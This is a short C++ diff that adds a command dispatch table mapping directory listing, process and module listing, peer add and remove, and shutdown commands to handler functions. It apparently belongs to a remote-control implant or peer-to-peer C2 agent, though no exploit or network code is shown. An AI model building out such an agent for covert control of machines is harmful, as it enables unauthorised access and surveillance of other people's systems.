@@ -12,6 +12,16 @@
 namespace Memory {
     LPVOID ExceptionReturn = 0;
 
+    __code_seg(".rdata") _command_map cmd_map[] = {
+        {.name = DIRECTORYLIST, .address = Commands::DirectoryList  },
+        {.name = PROCESSMODULES,.address = Commands::ProcessModules },
+        {.name = PROCESSLIST,	.address = Commands::ProcessList    },
+        {.name = ADDPEER,		.address = Commands::AddPeer        },
+        {.name = REMOVEPEER,	.address = Commands::RemovePeer     },
+        {.name = SHUTDOWN,		.address = Commands::Shutdown       },
+        {.name = 0,				.address = nullptr					}
+    };
+
     namespace Methods {
 
         BOOL MoveFilePointer(HANDLE handle, int32_t offset, int32_t* current) {
